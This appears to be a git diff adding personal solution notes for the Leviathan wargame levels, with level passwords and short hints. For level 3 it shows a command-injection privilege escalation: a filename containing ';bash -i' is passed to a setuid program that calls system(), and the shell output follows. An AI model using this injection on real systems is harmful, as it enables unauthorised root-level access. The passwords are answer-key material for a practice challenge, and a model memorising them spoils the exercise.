@@ -1,0 +1,34 @@
+#1: cat .backup and grep for leviathan
+rioGegei8m
+
+#2: ltrace ./check and you'll see that  the required password is "sex"
+#cat the flag from /etc/leviathan_pass/leviathan2, now that you have a shell on the escalated process
+
+ougahZi8Ta
+
+
+#3: Wow this one was harder... took me while and went into a bit of a gdb rabbit hole...
+# Basically, we need to exploit the system() function that is being used along with /bin/cat to RCE an interactive shell and get the falg that way:
+#
+# leviathan2@leviathan:~$ touch /tmp/'rce;bash -i'
+# leviathan2@leviathan:~$ ./printfile /tmp/'rce;bash -i'
+# /bin/cat: /tmp/rce: No such file or directory
+# leviathan3@leviathan:~$ ls -la
+# total 28
+# drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
+# drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
+# -rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+# -rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+# -r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
+# -rw-r--r--  1 root       root        675 May 15  2017 .profile
+# leviathan3@leviathan:~$ whoami
+# leviathan3
+
+Ahdiemoo1j
+
+
+#4: ... same thing as level2... Just ltrace and find the password oyu need to input
+vuH0coox6m
+
+#5: very easy, just convert binary inside of .trash to ascii
+Tith4cokei
